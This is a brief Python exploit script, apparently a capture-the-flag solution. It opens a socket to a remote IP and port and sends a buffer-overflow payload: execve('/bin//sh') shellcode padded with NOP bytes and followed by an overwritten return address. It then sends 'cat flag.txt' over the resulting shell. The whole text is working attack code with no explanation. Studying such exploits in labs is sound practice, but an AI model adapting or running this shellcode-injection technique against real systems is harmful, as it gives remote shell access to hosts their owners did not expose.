import socket, struct, time

HOST, PORT = "154.57.164.69", 30298
sc = (
    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  # execve("/bin//sh",0,0)
)
payload = sc.ljust(0x100, b"\x90") + struct.pack("<Q", 0x401041)

s = socket.create_connection((HOST, PORT))
print(s.recv(4096).decode())
s.sendall(payload)
time.sleep(0.1)
s.sendall(b"cat flag.txt\n")
time.sleep(0.2)
print(s.recv(4096).decode())
s.close()
